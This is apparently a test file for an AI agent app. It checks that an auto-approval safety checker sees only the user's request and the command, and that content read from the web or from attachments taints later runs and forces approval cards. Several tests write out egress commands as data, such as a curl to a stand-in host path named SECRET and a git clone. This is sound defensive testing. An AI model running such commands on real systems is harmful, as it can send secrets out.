import assert from 'node:assert/strict';
import { mkdirSync, writeFileSync } from 'node:fs';
import { join } from 'node:path';
import { test } from 'node:test';
import type { RunEvent, StopReason, ToolCall } from '../src/engine/types.ts';
import { App } from '../src/app.ts';
import { resolvePaths } from '../src/paths.ts';
import { TAINTED_NOTE } from '../src/tools/auto-approve.ts';
import type { PageNetwork, PageResponse } from '../src/tools/web/public-page.ts';
import { CONVERSATION, fakeModel, settled, startApp, waitFor } from './app-setup.ts';
import { fail, FakeAdapter, tempDir, testConfig, type Script } from './helpers.ts';

// 段 8b: 自動承認を、会話のエンジンから通して確かめる（判定役は同じモデルの提供元に、偽のアダプタが答える）

type Started = Awaited<ReturnType<typeof startApp>>;

const say = (text: string): Script => async function* () { yield { type: 'text', delta: text }; yield { type: 'done', stop: 'end_turn' as StopReason }; };
const toolCall = (name: string, args: unknown, before = ''): Script => async function* () {
  if (before) yield { type: 'text', delta: before };
  const call: ToolCall = { id: `call_${Math.random().toString(36).slice(2)}`, name, arguments: args };
  yield { type: 'tool_call', call };
  yield { type: 'done', stop: 'tool_use' as StopReason };
};
function gate() { let open!: () => void; const promise = new Promise<void>(resolve => { open = resolve; }); return { promise, open }; }
const after = (g: { promise: Promise<void> }, script: Script): Script => async function* (req) {
  await Promise.race([g.promise, new Promise<never>((_, reject) => { req.signal.addEventListener('abort', () => reject(req.signal.reason), { once: true }); })]);
  yield* script(req);
};

const ALLOW = '{"decision":"allow","reason":"依頼どおりに外のメモを読むだけです"}';
const REQUEST = '外のメモ（outside.txt）を読んで';

function outsideRead(s: Started): { path: string; command: string } {
  mkdirSync(s.paths.workspace, { recursive: true });
  const path = join(s.paths.data, 'outside.txt');
  writeFileSync(path, '外のメモの中身');
  return { path, command: process.platform === 'win32' ? `Get-Content "${path}"` : `cat "${path}"` };
}

const post = (s: Started, text: string, extra: Record<string, unknown> = {}) => s.json(`/api/conversations/${CONVERSATION}/messages`, 'POST', { text, ...extra });
const isClassifier = (req: { tools: unknown[]; system: { frozen: string } }) => req.tools.length === 0 && req.system.frozen.includes('safety checker');
const classifierText = (s: { adapter: () => FakeAdapter }): string => s.adapter().calls.filter(isClassifier).map(c => JSON.stringify(c.messages) + c.system.frozen + c.system.dynamic).join('\n');
const autoRows = (s: { app: App }) => s.app.db.prepare("SELECT status, scope, reasons FROM approvals WHERE scope = 'auto'").all() as Array<{ status: string; scope: string; reasons: string }>;

test('自動承認（エンジン）: 外のメモを読むコマンドは、判定役（同じモデル）が allow なら札なしで動き、判定役が見るのは利用者の最後の発言と操作だけ', async t => {
  const s = await startApp(t);
  const outside = outsideRead(s);
  writeFileSync(join(s.paths.workspace, 'a.txt'), 'TOOL-RESULT-MARKER');
  s.adapter().scripts = [
    toolCall('file_read', { path: 'a.txt' }, 'ASSISTANT-TEXT-MARKER まず a.txt を読みます'),
    toolCall('shell_run', { command: outside.command }),
    say(ALLOW),
    say('読みました'),
  ];
  const seen: RunEvent[] = [];
  s.app.bus.subscribe(e => { seen.push(e.event); });
  const sent = await post(s, REQUEST, { permissionMode: 'auto' });
  await settled(s.app, sent.body.runId);
  const calls = s.adapter().calls;
  assert.equal(calls.length, 4, '本体 2 回 + 判定役 1 回 + 本体の最後 1 回');
  assert.equal(s.app.approvals.pending().length, 0, '札は出ない');
  const classifier = calls[2]!;
  assert.ok(isClassifier(classifier), '3 番目は判定役の呼び出し（道具なし）');
  assert.ok(calls.filter(isClassifier).length === 1);
  assert.equal(classifier.model.id, calls[1]!.model.id, '判定役は、その実行が使っているモデルそのもの');
  assert.equal(classifier.messages.length, 1);
  const shown = JSON.stringify(classifier.messages) + classifier.system.frozen + classifier.system.dynamic;
  assert.ok(shown.includes(REQUEST), '利用者の最後の発言を見せる');
  assert.ok(shown.includes('outside.txt'), '操作（コマンド）を見せる');
  assert.ok(!shown.includes('TOOL-RESULT-MARKER'), '道具の結果は見せない');
  assert.ok(!shown.includes('ASSISTANT-TEXT-MARKER'), 'Clive の返事は見せない');
  assert.ok(!shown.includes('外のメモの中身'), 'ファイルの中身は見せない');
  const final = JSON.stringify(calls[3]!.messages);
  assert.ok(final.includes('外のメモの中身'), '許したコマンドは実際に動き、その結果を本体が読む');
  assert.ok(!final.includes('safety checker') && !final.includes('依頼どおりに外のメモを読むだけです'), '判定役のやり取りは会話の履歴に入らない');
  const rows = autoRows(s);
  assert.equal(rows.length, 1);
  assert.equal(rows[0]!.status, 'approved');
  assert.match((JSON.parse(rows[0]!.reasons) as string[]).at(-1)!, /依頼どおりに外のメモを読むだけです/u);
  const api = await s.json('/api/tool-calls?limit=10', 'GET');
  const shell = api.body.toolCalls.find((c: { tool: string }) => c.tool === 'shell_run');
  assert.deepEqual([shell.decision, shell.decided_by, shell.autoReason], ['allow', 'auto-mode', '依頼どおりに外のメモを読むだけです']);
  assert.equal(api.body.toolCalls.find((c: { tool: string }) => c.tool === 'file_read').autoReason, null, 'ほかの呼び出しは null');
  assert.deepEqual(seen.filter(e => e.type === 'tool.auto').map(e => (e as { state: string }).state), ['checking', 'allowed']);
  assert.equal(s.app.runs.get(sent.body.runId)!.model_id, calls[1]!.model.id);
  assert.equal(s.app.db.prepare('SELECT COUNT(*) AS n FROM engine_runs').get()!.n, 1, '判定役の呼び出しは engine_runs に入れない');
});

test('自動承認（エンジン）: 判定役はその実行が使っているモデル。会話でモデルを選んでいれば、そのモデル', async t => {
  const s = await startApp(t, { models: [fakeModel('m1'), fakeModel('m2')] });
  const outside = outsideRead(s);
  s.adapter().scripts = [toolCall('shell_run', { command: outside.command }), say(ALLOW), say('読みました')];
  const sent = await post(s, REQUEST, { permissionMode: 'auto', modelId: 'm2' });
  await settled(s.app, sent.body.runId);
  assert.deepEqual(s.adapter().calls.map(c => c.model.id), ['m2', 'm2', 'm2']);
  assert.ok(isClassifier(s.adapter().calls[1]!));
});

test('自動承認（エンジン）: ふつうのモードでは判定役を呼ばず、承認の札が出る', async t => {
  const s = await startApp(t);
  const outside = outsideRead(s);
  s.adapter().scripts = [toolCall('shell_run', { command: outside.command }), say('読みました')];
  const sent = await post(s, REQUEST);
  await waitFor(() => s.app.approvals.pending().length === 1, '承認の札');
  assert.equal(s.adapter().calls.length, 1, '判定役を呼んでいない');
  const [request] = s.app.approvals.pending();
  assert.deepEqual([...(request!.kinds ?? [])], ['outside_read']);
  assert.equal((await s.json(`/api/approvals/${request!.id}`, 'POST', { decision: 'once' })).status, 200);
  await settled(s.app, sent.body.runId);
  assert.equal(s.adapter().calls.filter(isClassifier).length, 0);
  assert.equal(autoRows(s).length, 0);
});

test('自動承認（エンジン）: 実行の途中でふつうに戻したら、その場から効く（判定役を呼ばず、札が出る）。途中で自動承認にしても、走っている実行は自動にならない', async t => {
  const s = await startApp(t);
  const outside = outsideRead(s);
  const g = gate();
  s.adapter().scripts = [after(g, toolCall('shell_run', { command: outside.command })), say('読みました')];
  const sent = await post(s, REQUEST, { permissionMode: 'auto' });
  assert.equal((await s.json(`/api/conversations/${CONVERSATION}`, 'PATCH', { permissionMode: 'normal' })).status, 200);
  g.open();
  await waitFor(() => s.app.approvals.pending().length === 1, '承認の札');
  assert.equal(s.adapter().calls.filter(isClassifier).length, 0);
  s.app.approvals.decide(s.app.approvals.pending()[0]!.id, 'deny');
  await settled(s.app, sent.body.runId);

  const t2 = await startApp(t);
  const outside2 = outsideRead(t2);
  const g2 = gate();
  t2.adapter().scripts = [after(g2, toolCall('shell_run', { command: outside2.command })), say('読みました')];
  const second = await post(t2, REQUEST);
  await t2.json(`/api/conversations/${CONVERSATION}`, 'PATCH', { permissionMode: 'auto' });
  g2.open();
  await waitFor(() => t2.app.approvals.pending().length === 1, '始めがふつうの実行は、途中で自動承認にしても札が出る');
  assert.equal(t2.adapter().calls.filter(isClassifier).length, 0);
  t2.app.approvals.decide(t2.app.approvals.pending()[0]!.id, 'deny');
  await settled(t2.app, second.body.runId);
});

test('自動承認（エンジン）: 判定役のモデルの呼び出しが失敗したら、承認の札が出る。許せば動く', async t => {
  const s = await startApp(t);
  const outside = outsideRead(s);
  s.adapter().scripts = [toolCall('shell_run', { command: outside.command }), fail(new Error('接続できません')), say('読みました')];
  const sent = await post(s, REQUEST, { permissionMode: 'auto' });
  await waitFor(() => s.app.approvals.pending().length === 1, '判定役が失敗したので札');
  const [request] = s.app.approvals.pending();
  assert.match(request!.reasons.join('\n'), /答えられなかった/u);
  s.app.approvals.decide(request!.id, 'once');
  await settled(s.app, sent.body.runId);
  assert.equal(autoRows(s).length, 0);
  assert.equal(s.app.db.prepare("SELECT decided_by FROM tool_calls WHERE tool = 'shell_run'").get()!.decided_by, 'user');
});

test('自動承認（エンジン）: 今回だけの確かめ（コードを動かす）は、判定役が allow でも札が出て、判定役は呼ばれない。添付つきの発言（よそから来た文）のあとの外読みは、判定役が決める', async t => {
  const s = await startApp(t);
  mkdirSync(s.paths.workspace, { recursive: true });
  writeFileSync(join(s.paths.workspace, 'put.js'), "console.log('x');\n");
  s.adapter().scripts = [toolCall('shell_run', { command: 'node put.js' }), say(ALLOW), say('おわり')];
  const sent = await post(s, '動かして', { permissionMode: 'auto' });
  await waitFor(() => s.app.approvals.pending().length === 1, '今回だけの札');
  assert.equal(s.app.approvals.pending()[0]!.onceOnly, true);
  assert.equal(s.adapter().calls.filter(isClassifier).length, 0);
  s.app.approvals.decide(s.app.approvals.pending()[0]!.id, 'deny');
  await settled(s.app, sent.body.runId);

  // 添付つきの発言は、よそから来た文。そのあとの外読みも、判定役が決める（Q16）。判定役には「よそから来た文を読んだ会話」と伝わる
  const t2 = await startApp(t);
  const outside = outsideRead(t2);
  const upload = t2.app.uploads.save({ name: 'memo.txt', mime: 'text/plain', body: Buffer.from('添付の文') });
  t2.adapter().scripts = [toolCall('shell_run', { command: outside.command }), say(ALLOW), say('おわり')];
  const attached = await t2.json(`/api/conversations/${CONVERSATION}/messages`, 'POST', { text: REQUEST, attachments: [upload.id], permissionMode: 'auto' });
  await settled(t2.app, attached.body.runId);
  assert.equal(t2.app.approvals.pending().length, 0, '札は出ない');
  assert.equal(t2.adapter().calls.filter(isClassifier).length, 1, '判定役が決めた');
  assert.ok(classifierText(t2).includes(TAINTED_NOTE), '判定役に、よそから来た文を読んだ会話だと伝える');
  assert.equal(autoRows(t2).length, 1);
  assert.match((JSON.parse(autoRows(t2)[0]!.reasons) as string[]).join('\n'), /よそから来た文/u, '理由に taint が載る');
});

// ── 外から読んだ内容のあと（Web）。同じ実行の中でも、止めたあとの次の実行にも持ち越す ──

async function webApp(t: { after: (fn: () => void) => void }) {
  const paths = resolvePaths(tempDir(t));
  mkdirSync(paths.data, { recursive: true });
  const config = testConfig();
  config.providers = [{ id: 'fake', kind: 'openai_compatible', baseUrl: 'http://127.0.0.1:1/v1', maxParallel: 1, timeoutMs: 10_000 }];
  config.models = [fakeModel('m')];
  config.routing = { chat: ['m'], background: [], retriesPerModel: 0 };
  config.memory.review = false;
  writeFileSync(paths.config, JSON.stringify(config));
  const network: PageNetwork = {
    resolve: async () => ['93.184.216.34'],
    get: async () => ({ status: 200, contentType: 'text/html; charset=utf-8', body: Buffer.from('<!doctype html><html><head><title>t</title></head><body><main><p>ページの本文</p></main></body></html>') }) as PageResponse,
  };
  let adapter!: FakeAdapter;
  const app = new App({ paths, databasePath: ':memory:', log: () => undefined, workerTimers: false, webNetwork: network, adapterOverride: p => (adapter = new FakeAdapter(p)) });
  await app.status.probeAll(app.config());
  t.after(() => app.close());
  mkdirSync(paths.workspace, { recursive: true });
  const outsidePath = join(paths.data, 'outside.txt');
  writeFileSync(outsidePath, '外のメモの中身');
  const command = process.platform === 'win32' ? `Get-Content "${outsidePath}"` : `cat "${outsidePath}"`;
  return { app, adapter: () => adapter, command };
}

test('自動承認（エンジン）: Web を読んだあとの外読みは、判定役が決める（taint）。allow なら札なしで動く', async t => {
  const s = await webApp(t);
  s.adapter().scripts = [toolCall('web_fetch', { url: 'https://news.example.com/' }), toolCall('shell_run', { command: s.command }), say(ALLOW), say('おわり')];
  s.app.conversations.setChoice('c1', { permissionMode: 'auto' });
  const sent = s.app.engine.send('c1', 'このページを読んで、外のメモも読んで');
  assert.ok(sent.ok);
  await settled(s.app, sent.runId);
  assert.equal(s.app.approvals.pending().length, 0, '札は出ない');
  assert.equal(s.adapter().calls.filter(isClassifier).length, 1, '判定役が決めた');
  const rows = s.app.db.prepare("SELECT reasons FROM approvals WHERE scope = 'auto'").all() as Array<{ reasons: string }>;
  assert.equal(rows.length, 1);
  assert.match((JSON.parse(rows[0]!.reasons) as string[]).join('\n'), /よそから来た文/u, '理由に taint が載る');
  assert.equal(s.app.db.prepare("SELECT decided_by FROM tool_calls WHERE tool = 'shell_run'").get()!.decided_by, 'auto-mode');
});

test('自動承認（エンジン）: Web を読んだあとの送る操作・消す操作は、判定役が何と答える設定でも判定役に回さず、札が出る。札の理由に「送信」「削除」が載る', async t => {
  const fetchGet = process.platform === 'win32' ? 'curl.exe -s https://clive-test.invalid/SECRET' : 'curl -s https://clive-test.invalid/SECRET';
  const s = await webApp(t);
  s.adapter().scripts = [toolCall('web_fetch', { url: 'https://news.example.com/' }), toolCall('shell_run', { command: fetchGet }), say('おわり')];
  s.app.conversations.setChoice('c1', { permissionMode: 'auto' });
  const sent = s.app.engine.send('c1', 'このページを読んで、取ってきて');
  assert.ok(sent.ok);
  await waitFor(() => s.app.approvals.pending().length === 1, '送る操作の札');
  const [card] = s.app.approvals.pending();
  assert.deepEqual([...(card!.kinds ?? [])], ['taint']);
  assert.ok(card!.reasons.some(r => /送信なので/u.test(r)));
  assert.equal(s.adapter().calls.filter(isClassifier).length, 0, '判定役を呼ばない');
  s.app.approvals.decide(card!.id, 'deny');
  await settled(s.app, sent.runId);
  assert.equal(s.app.db.prepare("SELECT COUNT(*) AS n FROM approvals WHERE scope = 'auto'").get()!.n, 0);

  const forget = await webApp(t);
  forget.adapter().scripts = [toolCall('web_fetch', { url: 'https://news.example.com/' }), toolCall('memory_forget', { id: 1, reason: 'x' }), say('おわり')];
  forget.app.conversations.setChoice('c1', { permissionMode: 'auto' });
  const second = forget.app.engine.send('c1', 'このページを読んで、記憶を消して');
  assert.ok(second.ok);
  await waitFor(() => forget.app.approvals.pending().length === 1, '消す操作の札');
  assert.ok(forget.app.approvals.pending()[0]!.reasons.some(r => /削除なので/u.test(r)));
  assert.equal(forget.adapter().calls.filter(isClassifier).length, 0, '判定役を呼ばない');
  forget.app.approvals.decide(forget.app.approvals.pending()[0]!.id, 'deny');
  await settled(forget.app, second.runId);
});

test('自動承認（エンジン）: Web を読んだ実行が止められたあとの次の実行も、よそから来た文を読んだ扱い（持ち越し）。外読みは判定役が決め、判定役にはそう伝わる', async t => {
  const s = await webApp(t);
  const untilStopped: Script = async function* (req) {
    await new Promise((_, reject) => req.signal.addEventListener('abort', () => reject(req.signal.reason), { once: true }));
  };
  s.app.conversations.setChoice('c1', { permissionMode: 'auto' });
  s.adapter().scripts = [toolCall('web_fetch', { url: 'https://news.example.com/' }), untilStopped];
  const first = s.app.engine.send('c1', 'このページを読んで');
  assert.ok(first.ok);
  await waitFor(() => s.adapter().calls.length >= 2, '道具のあとの 2 回目の呼び出し');
  s.app.engine.stop(first.runId);
  await settled(s.app, first.runId);
  await s.app.engine.wait(first.runId);
  assert.equal(s.app.runs.get(first.runId)!.tainted, 1);

  s.adapter().scripts = [toolCall('shell_run', { command: s.command }), say(ALLOW), say('おわり')];
  const second = s.app.engine.send('c1', '続けて、外のメモも読んで');
  assert.ok(second.ok);
  await settled(s.app, second.runId);
  assert.equal(s.app.approvals.pending().length, 0, '札は出ない');
  assert.equal(s.adapter().calls.filter(isClassifier).length, 1, '判定役が決めた');
  assert.ok(classifierText(s).includes(TAINTED_NOTE), '持ち越した印は、判定役に伝わる');
  assert.match((JSON.parse(autoRows(s)[0]!.reasons) as string[]).join('\n'), /よそから来た文/u, '理由に taint が載る（持ち越した印）');
});

test('自動承認（エンジン）: 外のメモを自動で読んだあとの、許可の一覧にある取得（curl）は、同じ返事の中でも札が出る。判定役は 2 回目を見ない', async t => {
  const s = await startApp(t);
  const outside = outsideRead(s);
  const fetch = process.platform === 'win32' ? 'curl.exe -s https://clive-test.invalid/SECRET' : 'curl -s https://clive-test.invalid/SECRET';
  s.adapter().scripts = [toolCall('shell_run', { command: outside.command }), say(ALLOW), toolCall('shell_run', { command: fetch }), say('おわり')];
  const sent = await post(s, REQUEST, { permissionMode: 'auto' });
  await waitFor(() => s.app.approvals.pending().length === 1, '外を読んだあとの取得の札');
  const [request] = s.app.approvals.pending();
  assert.deepEqual([...(request!.kinds ?? [])], ['egress']);
  assert.equal(request!.everyTime, true);
  assert.equal(s.adapter().calls.filter(isClassifier).length, 1, '判定役を呼んだのは、最初の外読みだけ');
  s.app.approvals.decide(request!.id, 'deny');
  await settled(s.app, sent.body.runId);
  assert.equal(autoRows(s).length, 1, '自動で許したのは最初の外読みだけ');
});

test('自動承認（エンジン）: シェルで外から取得したら、実行の記録に「外から読んだ」印が残る。そのあとの外読みは判定役が決める', async t => {
  const s = await startApp(t);
  const outside = outsideRead(s);
  const fetch = process.platform === 'win32' ? 'curl.exe -s https://clive-test.invalid/SECRET' : 'curl -s https://clive-test.invalid/SECRET';
  s.adapter().scripts = [toolCall('shell_run', { command: fetch }), toolCall('shell_run', { command: outside.command }), say(ALLOW), say('おわり')];
  const sent = await post(s, REQUEST, { permissionMode: 'auto' });
  await settled(s.app, sent.body.runId);
  assert.equal(s.app.approvals.pending().length, 0, '札は出ない');
  assert.equal(s.adapter().calls.filter(isClassifier).length, 1, '判定役が決めた');
  assert.equal(s.app.runs.get(sent.body.runId)!.tainted, 1, '実行の記録に印が残る（止めた・落ちた実行の次の実行へ引き継ぐ材料）');
  assert.equal(autoRows(s).length, 1);
  assert.deepEqual([...(JSON.parse(autoRows(s)[0]!.reasons) as string[])].filter(r => /よそから来た文/u.test(r)).length, 1, '理由に taint が載る');
});

// ── 会話の印（一度でも外から読んだ会話は、判定役を使わない）と、自動承認で外を読んだ印の持ち越し ──

test('自動承認（エンジン）: 一度でもよそから来た文を読んだ実行のある会話は、最後まで返事を書いて「読んだ」扱いが切れたあとの別の実行でも、判定役に「よそから来た文を読んだ会話」と伝える。外読みは判定役が決める', async t => {
  const s = await webApp(t);
  s.app.conversations.setChoice('c1', { permissionMode: 'auto' });
  s.adapter().scripts = [toolCall('web_fetch', { url: 'https://news.example.com/' }), say('読みました')];
  const first = s.app.engine.send('c1', 'このページを読んで');
  assert.ok(first.ok);
  await settled(s.app, first.runId);
  await s.app.engine.wait(first.runId);
  assert.equal(s.app.runs.get(first.runId)!.ok, 1);
  assert.equal(s.app.conversations.everTainted('c1'), true);

  s.adapter().scripts = [toolCall('shell_run', { command: s.command }), say(ALLOW), say('おわり')];
  const second = s.app.engine.send('c1', '外のメモも読んで');
  assert.ok(second.ok);
  await settled(s.app, second.runId);
  assert.equal(s.app.approvals.pending().length, 0, '札は出ない');
  assert.equal(s.adapter().calls.filter(isClassifier).length, 1, '判定役が決めた');
  assert.ok(classifierText(s).includes(TAINTED_NOTE), '会話の印は、判定役に伝わる');
  const reasons = JSON.parse(autoRows(s)[0]!.reasons) as string[];
  assert.ok(!reasons.some(r => /よそから来た文/u.test(r)), 'この実行は読んでいないので、taint の理由は載らない');
});

test('自動承認（エンジン）: 外から読んだことの無い会話には印が付かない。シェルで取得した・添付を付けた会話には付く', async t => {
  const s = await startApp(t);
  const outside = outsideRead(s);
  s.adapter().scripts = [toolCall('shell_run', { command: outside.command }), say(ALLOW), say('読みました')];
  const sent = await post(s, REQUEST, { permissionMode: 'auto' });
  await settled(s.app, sent.body.runId);
  assert.equal(s.app.conversations.everTainted(CONVERSATION), false, '外を読んだだけでは付かない（許可フォルダの外のファイルは、外から来た文ではない）');

  const fetching = await startApp(t);
  const fetch = process.platform === 'win32' ? 'curl.exe -s https://clive-test.invalid/' : 'curl -s https://clive-test.invalid/';
  fetching.adapter().scripts = [toolCall('shell_run', { command: fetch }), say('取得しました')];
  const second = await post(fetching, '取得して');
  await settled(fetching.app, second.body.runId);
  assert.equal(fetching.app.conversations.everTainted(CONVERSATION), true);

  const attached = await startApp(t);
  const upload = attached.app.uploads.save({ name: 'memo.txt', mime: 'text/plain', body: Buffer.from('添付の文') });
  attached.adapter().scripts = [say('読みました')];
  const third = await post(attached, REQUEST, { attachments: [upload.id] });
  await settled(attached.app, third.body.runId);
  assert.equal(attached.app.conversations.everTainted(CONVERSATION), true);
});

test('自動承認（エンジン）: 自動で外を読んだ実行を止めた・失敗したあとの次の実行も、シェルのコマンドは毎回確かめる（会話の印が残る）', async t => {
  const untilStopped: Script = async function* (req) {
    await new Promise((_, reject) => req.signal.addEventListener('abort', () => reject(req.signal.reason), { once: true }));
  };
  // 止めた実行
  const stopped = await startApp(t);
  const outside = outsideRead(stopped);
  stopped.adapter().scripts = [toolCall('shell_run', { command: outside.command }), say(ALLOW), untilStopped];
  const first = await post(stopped, REQUEST, { permissionMode: 'auto' });
  await waitFor(() => stopped.adapter().calls.length >= 3, '外を読んだあとの 2 回目の呼び出し');
  stopped.app.engine.stop(first.body.runId);
  await settled(stopped.app, first.body.runId);
  await stopped.app.engine.wait(first.body.runId);
  assert.equal(stopped.app.conversations.everAutoRead(CONVERSATION), true, '会話の印が付く');
  stopped.adapter().scripts = [toolCall('shell_run', { command: outside.command }), say(ALLOW), say('おわり')];
  const second = await post(stopped, '続けて、もう一度読んで', { permissionMode: 'auto' });
  await waitFor(() => stopped.app.approvals.pending().length === 1, '持ち越した印のあとの札');
  assert.deepEqual([...(stopped.app.approvals.pending()[0]!.kinds ?? [])].sort(), ['egress', 'outside_read']);
  assert.equal(stopped.app.approvals.pending()[0]!.everyTime, true);
  assert.equal(stopped.adapter().calls.filter(isClassifier).length, 1, '判定役を呼んだのは、止めた実行の外読みだけ');
  stopped.app.approvals.decide(stopped.app.approvals.pending()[0]!.id, 'deny');
  await settled(stopped.app, second.body.runId);

  // 失敗した実行（使えるモデルが 1 つで、読んだあとの呼び出しが失敗する）
  const failing = await startApp(t, { models: [fakeModel('only')] });
  const outside2 = outsideRead(failing);
  failing.adapter().scripts = [toolCall('shell_run', { command: outside2.command }), say(ALLOW), fail(new Error('接続できません'))];
  const third = await post(failing, REQUEST, { permissionMode: 'auto' });
  await settled(failing.app, third.body.runId);
  await failing.app.engine.wait(third.body.runId);
  assert.equal(failing.app.runs.get(third.body.runId)!.ok, 0);
  assert.equal(failing.app.conversations.everAutoRead(CONVERSATION), true);
  failing.adapter().scripts = [toolCall('shell_run', { command: outside2.command }), say(ALLOW), say('おわり')];
  const fourth = await post(failing, '続けて', { permissionMode: 'auto' });
  await waitFor(() => failing.app.approvals.pending().length === 1, '失敗した実行のあとの札');
  assert.ok(failing.app.approvals.pending()[0]!.kinds?.includes('egress'));
  failing.app.approvals.decide(failing.app.approvals.pending()[0]!.id, 'deny');
  await settled(failing.app, fourth.body.runId);
});

test('自動承認（エンジン）: 持ち主が札で許した git clone も、動かしたら「外から読んだ」印が付く。そのあとの外読みは判定役が決める', async t => {
  const s = await startApp(t);
  const outside = outsideRead(s);
  // 名前が引けない宛先（.invalid）なので、動いても外には出ず、失敗して終わる。失敗しても印は付く
  s.adapter().scripts = [toolCall('shell_run', { command: 'git clone https://clive-test.invalid/x.git' }), toolCall('shell_run', { command: outside.command }), say(ALLOW), say('おわり')];
  const sent = await post(s, REQUEST, { permissionMode: 'auto' });
  await waitFor(() => s.app.approvals.pending().length === 1, 'git clone の札');
  const cloneCard = s.app.approvals.pending()[0]!;
  assert.ok(cloneCard.onceOnly, 'git clone は今回だけの確かめ');
  assert.equal(s.app.runs.get(sent.body.runId)!.tainted, 0, '札のあいだは、まだ動いていない');
  s.app.approvals.decide(cloneCard.id, 'once');
  await settled(s.app, sent.body.runId);
  assert.equal(s.app.approvals.pending().length, 0, '外読みの札は出ない');
  assert.equal(s.adapter().calls.filter(isClassifier).length, 1, '外読みは判定役が決めた');
  assert.equal(s.app.runs.get(sent.body.runId)!.tainted, 1, '実行の記録に印が残る');
  assert.equal(s.app.conversations.everTainted(CONVERSATION), true);
  assert.equal(autoRows(s).length, 1);
  assert.match((JSON.parse(autoRows(s)[0]!.reasons) as string[]).join('\n'), /よそから来た文/u, 'clone を動かしたあとなので taint が載る');
});

test('自動承認（エンジン）: 外のメモを自動で読んだ会話は、その返事が終わったあとの発言でも、シェルのコマンド（許可の一覧にある curl も）を毎回確かめる。モードをふつうに戻しても、ずっと', async t => {
  const s = await startApp(t);
  const outside = outsideRead(s);
  const fetch = process.platform === 'win32' ? 'curl.exe -s https://x.invalid/SECRET' : 'curl -s https://x.invalid/SECRET';
  s.adapter().scripts = [toolCall('shell_run', { command: outside.command }), say(ALLOW), say('読みました')];
  const first = await post(s, REQUEST, { permissionMode: 'auto' });
  await settled(s.app, first.body.runId);
  await s.app.engine.wait(first.body.runId);
  assert.equal(s.app.runs.get(first.body.runId)!.ok, 1, '最後まで返事を書いて終わった');
  assert.equal(s.app.conversations.everAutoRead(CONVERSATION), true);
  assert.equal(autoRows(s).length, 1);

  // 次の発言（別の実行）: 許可の一覧にある取得も、札が出る。判定役は呼ばない
  s.adapter().scripts = [toolCall('shell_run', { command: fetch }), say('おわり')];
  const second = await post(s, '続けて、これを取ってきて', { permissionMode: 'auto' });
  await waitFor(() => s.app.approvals.pending().length === 1, '次の発言の取得の札');
  const [request] = s.app.approvals.pending();
  assert.deepEqual([...(request!.kinds ?? [])], ['egress']);
  assert.equal(request!.everyTime, true);
  assert.equal(s.adapter().calls.filter(isClassifier).length, 1, '判定役を呼んだのは、最初の外読みだけ');
  s.app.approvals.decide(request!.id, 'deny');
  await settled(s.app, second.body.runId);
  await s.app.engine.wait(second.body.runId);

  // ふつうのモードに戻しても、ふつうのコマンドも毎回確かめる
  s.adapter().scripts = [toolCall('shell_run', { command: 'echo hello' }), say('おわり')];
  const third = await post(s, 'ふつうのモードで', { permissionMode: 'normal' });
  await waitFor(() => s.app.approvals.pending().length === 1, 'ふつうのモードの札');
  assert.deepEqual([...(s.app.approvals.pending()[0]!.kinds ?? [])], ['egress']);
  assert.equal(s.app.approvals.pending()[0]!.everyTime, true);
  s.app.approvals.decide(s.app.approvals.pending()[0]!.id, 'deny');
  await settled(s.app, third.body.runId);
  assert.equal(autoRows(s).length, 1);
});

test('自動承認（エンジン）: 判定役の返事が max_tokens で途中で切れたら、最後の行が allow に見えても許さず、札が出る', async t => {
  const s = await startApp(t);
  const outside = outsideRead(s);
  const cutOff = (text: string): Script => async function* () { yield { type: 'text', delta: text }; yield { type: 'done', stop: 'max_tokens' as StopReason }; };
  s.adapter().scripts = [toolCall('shell_run', { command: outside.command }), cutOff(ALLOW), say('読みました')];
  const sent = await post(s, REQUEST, { permissionMode: 'auto' });
  await waitFor(() => s.app.approvals.pending().length === 1, '返事が切れた判定役のあとの札');
  assert.match(s.app.approvals.pending()[0]!.reasons.join('\n'), /答えられなかった/u);
  assert.equal(s.adapter().calls.filter(isClassifier).length, 1);
  s.app.approvals.decide(s.app.approvals.pending()[0]!.id, 'deny');
  await settled(s.app, sent.body.runId);
  assert.equal(autoRows(s).length, 0);
});
